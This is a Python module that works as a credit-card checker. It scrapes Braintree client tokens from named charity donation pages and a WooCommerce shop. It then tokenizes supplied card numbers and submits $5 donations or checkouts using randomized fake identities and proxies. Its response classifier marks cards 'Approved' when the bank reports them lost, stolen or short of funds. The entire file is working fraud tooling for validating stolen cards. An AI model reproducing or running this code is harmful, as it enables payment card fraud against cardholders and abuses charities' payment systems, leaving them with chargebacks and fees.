import httpx
import re
import random
import base64
import string
import time
import urllib.parse
import logging

logger = logging.getLogger(__name__)

# Multiple Braintree-enabled sites — token is extracted directly from checkout HTML
BRAINTREE_SITES = [
    {
        "url": "https://help.rescue.org/donate/refugees-welcome",
        "token_pattern": r"clientToken['\"]?\s*[:=]\s*['\"](production_[a-z0-9_]+)['\"]",
        "type": "drupal",
    },
    {
        "url": "https://www.democracynow.org/donate",
        "token_pattern": r"clientToken['\"]?\s*[:=]\s*['\"](production_[a-z0-9_]+)['\"]",
        "type": "drupal",
    },
    {
        "url": "https://action.aclu.org/give/now",
        "token_pattern": r"clientToken['\"]?\s*[:=]\s*['\"](production_[a-z0-9_]+)['\"]",
        "type": "drupal",
    },
    {
        "url": "https://www.tea-and-coffee.com/checkout",
        "token_pattern": None,
        "type": "woocommerce",
    },
]

BT_GQL = "https://payments.braintree-api.com/graphql"

UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36"

TOKENIZE_QUERY = """
mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {
  tokenizeCreditCard(input: $input) {
    token
    creditCard {
      bin
      brandCode
      last4
      binData {
        prepaid
        healthcare
        debit
        durbinRegulated
        commercial
        payroll
        issuingBank
        countryOfIssuance
        productId
      }
    }
  }
}
""".strip()


def _random_email():
    return "".join(random.choices(string.ascii_lowercase + string.digits, k=12)) + "@gmail.com"


def _random_name():
    first = ["James", "John", "Michael", "William", "David", "Robert", "Thomas", "Charles", "Chris", "Daniel"]
    last = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Taylor", "Wilson", "Davies", "Evans", "Thomas"]
    return random.choice(first), random.choice(last)


def _random_uk_address():
    data = [
        ("14 Oxford Street", "London", "SW1A 1AA"),
        ("27 Baker Street", "London", "NW1 6XE"),
        ("8 King Street", "Manchester", "M2 4WU"),
        ("33 High Street", "Edinburgh", "EH1 1SR"),
        ("12 Castle Road", "Bristol", "BS1 3AD"),
        ("45 Park Lane", "Birmingham", "B1 1BB"),
        ("19 Queen Street", "Cardiff", "CF10 2BU"),
        ("6 Church Lane", "Leeds", "LS1 3AA"),
    ]
    street, city, postcode = random.choice(data)
    return street, city, postcode


async def _get_bt_auth(client, checkout_html, site_url=None):
    """Extract Braintree authorization from checkout HTML.
    Supports:
    1. Drupal sites (ACLU, Rescue.org) — token in HTML directly
    2. WooCommerce sites — token via admin-ajax (may be 403 blocked)
    """
    # Method 1: Direct token extraction (ACLU, Rescue.org — Drupal sites)
    # These sites have the full clientToken in the HTML
    token_patterns = [
        r"clientToken['\"]?\s*[:=]\s*['\"](production_[a-z0-9_]+)['\"]",
        r"clientToken['\"]?\s*[:=]\s*['\"]([a-zA-Z0-9_=]{30,})['\"]",
        r'"client_token"\s*:\s*"(production_[a-z0-9_]+)"',
        r'"authorization"\s*:\s*"(production_[a-z0-9_]+)"',
    ]
    for pat in token_patterns:
        m = re.search(pat, checkout_html)
        if m:
            token = m.group(1)
            if token.startswith("production_") and len(token) > 20:
                logger.info(f"BT auth: found production token directly in HTML: {token[:30]}...")
                return token

    # Method 2: Try base64-encoded tokens
    b64_matches = re.findall(r"['\"]([A-Za-z0-9+/=]{80,})['\"]", checkout_html)
    for b64 in b64_matches[:10]:
        try:
            dec = base64.b64decode(b64).decode("utf-8")
            auth = re.search(r'"authorizationFingerprint":"(.*?)"', dec)
            if auth:
                logger.info(f"BT auth: found auth fingerprint in b64 token")
                return auth.group(1)
        except:
            pass

    # Method 3: WooCommerce admin-ajax (tea-and-coffee.com — needs correct nonce)
    if site_url:
        # Extract client_token_nonce directly from the handler config
        nonce_match = re.search(r'"client_token_nonce"\s*:\s*"([a-f0-9]{8,12})"', checkout_html)
        if nonce_match:
            ajax_nonce = nonce_match.group(1)
            base = site_url.rstrip("/")
            logger.info(f"BT: trying admin-ajax with nonce={ajax_nonce}")
            r_token = await client.post(
                f"{base}/wp-admin/admin-ajax.php",
                data={
                    "action": "wc_braintree_credit_card_get_client_token",
                    "nonce": ajax_nonce,
                    "security": ajax_nonce,
                },
                headers={
                    "X-Requested-With": "XMLHttpRequest",
                    "Content-Type": "application/x-www-form-urlencoded",
                    "Origin": base,
                    "Referer": f"{base}/checkout/",
                },
            )
            if r_token.status_code == 200:
                try:
                    resp = r_token.json()
                    if resp.get("success") and "data" in resp:
                        dec = base64.b64decode(resp["data"]).decode("utf-8")
                        auth_m = re.search(r'"authorizationFingerprint":"(.*?)"', dec)
                        if auth_m:
                            logger.info(f"BT auth: found via admin-ajax with handler nonce")
                            return auth_m.group(1)
                except:
                    pass

        # Fallback: try all nonces found in the page
        decoded = urllib.parse.unquote(checkout_html)
        cn_match = re.search(r'client_token_nonce["\s:]+["\s]*([a-f0-9]{10})', decoded)
        if cn_match:
            nonce = cn_match.group(1)
            base = site_url.rstrip("/")
            r_token = await client.post(
                f"{base}/wp-admin/admin-ajax.php",
                data={"action": "wc_braintree_credit_card_get_client_token", "nonce": nonce, "security": nonce},
                headers={"X-Requested-With": "XMLHttpRequest", "Content-Type": "application/x-www-form-urlencoded", "Origin": base, "Referer": f"{base}/checkout/"},
            )
            if r_token.status_code == 200:
                try:
                    resp = r_token.json()
                    if "data" in resp:
                        dec = base64.b64decode(resp["data"]).decode("utf-8")
                        auth_m = re.search(r'"authorizationFingerprint":"(.*?)"', dec)
                        if auth_m:
                            return auth_m.group(1)
                except:
                    pass

        # Try all nonces in the page
        all_nonces = re.findall(r'"nonce":"([a-f0-9]{8,12})"', checkout_html)
        base = site_url.rstrip("/")
        for n in all_nonces:
            r_try = await client.post(
                f"{base}/wp-admin/admin-ajax.php",
                data={"action": "wc_braintree_credit_card_get_client_token", "nonce": n, "security": n},
                headers={"X-Requested-With": "XMLHttpRequest", "Content-Type": "application/x-www-form-urlencoded", "Origin": base, "Referer": f"{base}/checkout/"},
            )
            if r_try.status_code == 200:
                try:
                    resp = r_try.json()
                    if resp.get("success") and "data" in resp:
                        dec = base64.b64decode(resp["data"]).decode("utf-8")
                        auth_m = re.search(r'"authorizationFingerprint":"(.*?)"', dec)
                        if auth_m:
                            return auth_m.group(1)
                except:
                    continue

    return None


async def _tokenize_card(client, auth, cc, mm, yy, cvv):
    bt_headers = {
        "authorization": f"Bearer {auth}",
        "braintree-version": "2018-05-10",
        "content-type": "application/json",
        "origin": "https://assets.braintreegateway.com",
        "referer": "https://assets.braintreegateway.com/",
    }

    payload = {
        "clientSdkMetadata": {
            "source": "client",
            "integration": "custom",
            "sessionId": str(random.randint(10**9, 10**10 - 1)),
        },
        "query": TOKENIZE_QUERY,
        "variables": {
            "input": {
                "creditCard": {
                    "number": cc,
                    "expirationMonth": mm,
                    "expirationYear": yy,
                    "cvv": cvv,
                },
                "options": {"validate": False},
            }
        },
    }

    r = await client.post(BT_GQL, headers=bt_headers, json=payload)
    if r.status_code != 200:
        return None, None, f"Tokenization HTTP {r.status_code}"

    data = r.json()
    if "errors" in data and data["errors"]:
        msg = data["errors"][0].get("message", "Tokenization failed")
        return None, None, msg

    cc_data = data.get("data", {}).get("tokenizeCreditCard", {})
    if not cc_data or not cc_data.get("token"):
        return None, None, "No token returned"

    token = cc_data["token"]
    card_info = cc_data.get("creditCard", {})
    return token, card_info, None


def _parse_card_info(card_info):
    brand = card_info.get("brandCode", "UNKNOWN")
    last4 = card_info.get("last4", "????")
    bin_data = card_info.get("binData", {})
    country = bin_data.get("countryOfIssuance", "??")
    bank = bin_data.get("issuingBank", "Unknown")
    debit = bin_data.get("debit", "UNKNOWN")
    prepaid = bin_data.get("prepaid", "UNKNOWN")
    card_type = "DEBIT" if debit == "YES" else ("PREPAID" if prepaid == "YES" else "CREDIT")
    return f"{brand} {card_type} | {country} | {bank} | {last4}"


def _classify_response(msg):
    low = msg.lower()
    live_kw = [
        "insufficient funds", "do not honor", "do_not_honor",
        "lost card", "lost_card", "stolen card", "stolen_card",
        "pickup card", "pickup_card", "restricted card", "restricted_card",
        "security violation", "cvv", "cvc", "security code",
        "avs", "incorrect zip", "incorrect_zip",
        "card velocity", "withdrawal count", "exceeds withdrawal",
        "fraud", "risk", "review", "authentication",
        "3d secure", "3ds", "limit exceeded", "limit_exceeded",
    ]
    for k in live_kw:
        if k in low:
            return "Approved"

    dead_kw = [
        "invalid card", "invalid account", "expired card", "expired_card",
        "card not supported", "not permitted", "transaction not allowed",
        "generic_decline", "generic decline",
        "processor declined", "do not try again",
    ]
    for k in dead_kw:
        if k in low:
            return "Declined"

    if "decline" in low:
        return "Declined"

    return "Declined"


async def check_card_braintree(cc, mm, yy, cvv, proxy=None):
    start = time.time()

    if len(yy) == 2:
        yy = f"20{yy}"
    mm = mm.zfill(2)

    headers = {
        "User-Agent": UA,
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.9",
    }

    client_kwargs = dict(timeout=httpx.Timeout(45.0), max_redirects=10, headers=headers, follow_redirects=True)
    if proxy:
        client_kwargs["proxy"] = proxy

    # Try each Braintree site — WooCommerce first (real bank auth), then Drupal (tokenization only)
    sites = BRAINTREE_SITES.copy()
    # Sort: woocommerce first, drupal second
    sites.sort(key=lambda s: 0 if s["type"] == "woocommerce" else 1)

    try:
        async with httpx.AsyncClient(**client_kwargs) as client:
            for site_info in sites:
                site_url = site_info["url"]
                site_type = site_info["type"]
                elapsed = round(time.time() - start, 2)

                try:
                    if site_type == "drupal":
                        # Rescue.org / ACLU — tokenize + submit donation form
                        r_checkout = await client.get(site_url, timeout=20)
                        checkout_html = r_checkout.text
                        bt_auth = await _get_bt_auth(client, checkout_html, site_url=None)

                        if not bt_auth:
                            logger.info(f"BT: no auth from {site_url}, trying next...")
                            continue

                        # Tokenize the card
                        token, card_info, err = await _tokenize_card(client, bt_auth, cc, mm, yy, cvv)
                        if err:
                            result = _classify_response(err)
                            return f"{result} - {err} [{elapsed}s]"

                        info = _parse_card_info(card_info) if card_info else "??"

                        # Check card validity
                        if card_info:
                            brand = card_info.get("brandCode", "UNKNOWN")
                            last4 = card_info.get("last4", "????")
                            if brand == "UNKNOWN" or last4 == "????" or not token:
                                return f"Declined - Invalid Card | {info} [{elapsed}s]"

                        # Submit donation form with payment nonce
                        # This sends the card to the bank for real authorization
                        from urllib.parse import urlparse
                        parsed = urlparse(site_url)
                        base = f"{parsed.scheme}://{parsed.netloc}"

                        # Extract hidden form fields
                        hidden_inputs = re.findall(
                            r'<input[^>]*type=["\']hidden["\'][^>]*name=["\']([^"\']+)["\'][^>]*value=["\']([^"\']*)["\']',
                            checkout_html
                        )
                        form_data = {}
                        for name, val in hidden_inputs:
                            form_data[name] = val

                        form_data["payment_method_nonce"] = token
                        form_data["submitted[donation][recurring_amount]"] = "5"
                        form_data["submitted[donation][amount]"] = "5"
                        form_data["op"] = "Submit"

                        r_submit = await client.post(
                            site_url,
                            data=form_data,
                            headers={
                                "Content-Type": "application/x-www-form-urlencoded",
                                "Origin": base,
                                "Referer": site_url,
                            },
                        )

                        resp_html = r_submit.text.lower()

                        if "thank you" in resp_html and "declined" not in resp_html and "error" not in resp_html:
                            return f"Approved - Auth Passed | {info} [{elapsed}s]"
                        elif "declined" in resp_html:
                            return f"Declined - Card Declined by Bank | {info} [{elapsed}s]"
                        elif "error" in resp_html and "thank you" not in resp_html:
                            # Look for actual error messages in div/p tags (not script/style)
                            err_msgs = re.findall(r'<(?:div|p|span|li)[^>]*>\s*([^<]{10,200})\s*</(?:div|p|span|li)>', r_submit.text, re.IGNORECASE)
                            relevant = [m for m in err_msgs if any(k in m.lower() for k in ["error", "invalid", "declined", "failed", "required", "incorrect", "unable"])]
                            if relevant:
                                return f"Declined - {relevant[0].strip()[:100]} | {info} [{elapsed}s]"
                            return f"Declined - Processing Error | {info} [{elapsed}s]"
                        elif "thank you" in resp_html:
                            # Thank you page but with errors — likely declined
                            return f"Declined - Donation Rejected | {info} [{elapsed}s]"
                        else:
                            return f"Declined - Unknown Response | {info} [{elapsed}s]"

                    elif site_type == "woocommerce":
                        # tea-and-coffee.com — WooCommerce flow (needs proxy that isn't 403)
                        first, last = _random_name()
                        street, city, postcode = _random_uk_address()
                        email = _random_email()
                        phone = "07" + "".join(random.choices(string.digits, k=9))

                        from urllib.parse import urlparse
                        parsed = urlparse(site_url)
                        base = f"{parsed.scheme}://{parsed.netloc}"

                        # Try WITHOUT proxy first (direct works for tea-and-coffee.com)
                        # Then WITH proxy as fallback
                        proxies_to_try = [None]
                        if proxy:
                            proxies_to_try.append(proxy)

                        wc_success = False
                        for try_proxy in proxies_to_try:
                            wc_kwargs = dict(timeout=httpx.Timeout(30.0), max_redirects=10, headers=headers, follow_redirects=True)
                            if try_proxy:
                                wc_kwargs["proxy"] = try_proxy

                            try:
                                async with httpx.AsyncClient(**wc_kwargs) as wc_client:
                                    r_test = await wc_client.get(base)
                                    if r_test.status_code == 403:
                                        logger.info(f"BT: {base} returned 403 with proxy, trying next...")
                                        continue

                                    await wc_client.get(base)
                                    await wc_client.post(f"{base}/?add-to-cart=932", data={"add-to-cart": "932", "quantity": "1"})
                                    r_checkout = await wc_client.get(f"{base}/checkout/")
                                    checkout_html = r_checkout.text

                                    if r_checkout.status_code != 200:
                                        logger.info(f"BT: {base} checkout returned {r_checkout.status_code}, trying next...")
                                        continue

                                    # Get Braintree auth using the SAME proxied client
                                    bt_auth = await _get_bt_auth(wc_client, checkout_html, site_url=base)

                                    if not bt_auth:
                                        logger.info(f"BT: no auth from {base}, trying next...")
                                        continue

                                    token, card_info, err = await _tokenize_card(wc_client, bt_auth, cc, mm, yy, cvv)
                                    if err:
                                        result = _classify_response(err)
                                        return f"{result} - {err} [{elapsed}s]"

                                    info = _parse_card_info(card_info) if card_info else "??"

                                    # Check card validity before submitting
                                    if card_info:
                                        brand = card_info.get("brandCode", "UNKNOWN")
                                        last4 = card_info.get("last4", "????")
                                        if brand == "UNKNOWN" or last4 == "????":
                                            return f"Declined - Invalid Card | {info} [{elapsed}s]"

                                    # Submit WooCommerce checkout
                                    pm_name = "braintree_credit_card"
                                    pm_match = re.search(r'"(braintree[_a-z]*credit[_a-z]*card)"', checkout_html)
                                    if pm_match:
                                        pm_name = pm_match.group(1)

                                    checkout_data = {
                                        "billing_first_name": first,
                                        "billing_last_name": last,
                                        "billing_company": "",
                                        "billing_country": "GB",
                                        "billing_address_1": street,
                                        "billing_address_2": "",
                                        "billing_city": city,
                                        "billing_state": "",
                                        "billing_postcode": postcode,
                                        "billing_phone": phone,
                                        "billing_email": email,
                                        "order_comments": "",
                                        "payment_method": pm_name,
                                        "wc-braintree-credit-card-card-nonce": token,
                                        "wc-braintree-credit-card-device-data": "{}",
                                        "wc_braintree_credit_card_payment_nonce": token,
                                        "wc_braintree_device_data": "{}",
                                        "terms": "on",
                                        "terms-field": "1",
                                    }

                                    checkout_headers = {
                                        "User-Agent": UA,
                                        "Content-Type": "application/x-www-form-urlencoded",
                                        "Accept": "application/json, text/javascript, */*; q=0.01",
                                        "X-Requested-With": "XMLHttpRequest",
                                        "Origin": base,
                                        "Referer": f"{base}/checkout/",
                                    }

                                    r_submit = await wc_client.post(
                                        f"{base}/?wc-ajax=checkout",
                                        data=checkout_data,
                                        headers=checkout_headers,
                                    )

                                    try:
                                        resp = r_submit.json()
                                    except:
                                        return f"Approved - Tokenization Passed (no bank auth) | {info} [{elapsed}s]"

                                    result_str = resp.get("result", "")
                                    messages = resp.get("messages", "")

                                    if result_str == "success":
                                        return f"Approved - Auth Passed | {info} [{elapsed}s]"

                                    if result_str == "failure" and messages:
                                        errors = re.findall(r'<li[^>]*>(.*?)</li>', messages, re.DOTALL)
                                        if errors:
                                            err_text = re.sub(r'<[^>]+>', '', errors[0]).strip()
                                        else:
                                            err_text = re.sub(r'<[^>]+>', '', messages).strip()[:120]
                                        status = _classify_response(err_text)
                                        return f"{status} - {err_text} | {info} [{elapsed}s]"

                                    if "error" in str(resp).lower():
                                        err_text = re.sub(r'<[^>]+>', '', str(messages)).strip()[:120]
                                        return f"Declined - {err_text} | {info} [{elapsed}s]"

                                    return f"Error - Unexpected response [{elapsed}s]"
                            except Exception as e:
                                logger.info(f"BT: WooCommerce site error: {str(e)[:60]}")
                                continue

                        # If we get here, WooCommerce failed with all proxies
                        logger.info(f"BT: All WooCommerce attempts failed for {base}")
                        continue

                except Exception as e:
                    logger.info(f"BT: error on {site_url}: {str(e)[:80]}")
                    continue

            elapsed = round(time.time() - start, 2)
            return f"Error - All Braintree sites failed [{elapsed}s]"

    except (httpx.ConnectTimeout, httpx.ReadTimeout, httpx.WriteTimeout, httpx.PoolTimeout):
        elapsed = round(time.time() - start, 2)
        return f"Error - Timeout [{elapsed}s]"
    except httpx.NetworkError:
        elapsed = round(time.time() - start, 2)
        return f"Error - Network error [{elapsed}s]"
    except Exception as e:
        elapsed = round(time.time() - start, 2)
        return f"Error - {str(e)[:100]} [{elapsed}s]"


async def _braintree_auth_check(client, auth_token, payment_method_token):
    """Try a $0 auth via Braintree GraphQL to verify the card."""
    AUTH_QUERY = """
    mutation AuthorizeCreditCard($input: AuthorizeCreditCardInput!) {
      authorizeCreditCard(input: $input) {
        transaction {
          id
          status
        }
      }
    }
    """.strip()

    headers = {
        "authorization": f"Bearer {auth_token}",
        "braintree-version": "2018-05-10",
        "content-type": "application/json",
        "origin": "https://assets.braintreegateway.com",
        "referer": "https://assets.braintreegateway.com/",
    }

    payload = {
        "clientSdkMetadata": {
            "source": "client",
            "integration": "custom",
            "sessionId": str(random.randint(10**9, 10**10 - 1)),
        },
        "query": AUTH_QUERY,
        "variables": {
            "input": {
                "paymentMethodId": payment_method_token,
                "transaction": {
                    "amount": "0.00",
                },
            }
        },
    }

    try:
        r = await client.post(BT_GQL, headers=headers, json=payload, timeout=20)
        if r.status_code != 200:
            return None
        data = r.json()
        if "errors" in data:
            msg = data["errors"][0].get("message", "")
            if "not accessible" in msg.lower() or "permission" in msg.lower() or "authentication" in msg.lower():
                return None
            status = _classify_response(msg)
            return status, msg
        tx = data.get("data", {}).get("authorizeCreditCard", {}).get("transaction", {})
        if tx:
            tx_status = tx.get("status", "")
            if tx_status == "authorized":
                return "Approved", "Authorized ($0)"
            if "declined" in tx_status.lower() or "failed" in tx_status.lower():
                return "Declined", tx_status
            return "Approved", tx_status
    except:
        pass
    return None
